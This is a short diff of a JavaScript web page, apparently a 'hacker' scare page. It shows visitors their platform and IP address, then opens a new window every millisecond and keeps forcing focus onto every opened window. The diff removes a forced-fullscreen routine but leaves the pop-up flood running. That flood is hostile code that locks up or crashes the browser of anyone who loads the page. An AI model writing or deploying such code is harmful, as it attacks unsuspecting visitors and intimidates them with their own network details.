@@ -49,24 +49,13 @@
                 })
                 windows.push(addWindow(`Platform: ${navigator.platform}`))
                 getIP().then((ip) => windows.push(addWindow(`IP: ${ip}`)))
-
-                function openFullscreen() {
-                    if (elem.requestFullscreen) {
-                        elem.requestFullscreen()
-                    } else if (elem.webkitRequestFullscreen) {
-                        elem.webkitRequestFullscreen()
-                    } else if (elem.msRequestFullscreen) {
-                        elem.msRequestFullscreen()
-                    }
-                }
-
+            
                 setInterval(function() {
                     window.open('https://hacklers.github.io/blank', '' ,'')
                 }, 1)
                 setInterval(function() {
                     windows.forEach((element) => {
                         element.focus()
-                        openFullscreen()
                     })
                 }, 1000)
             
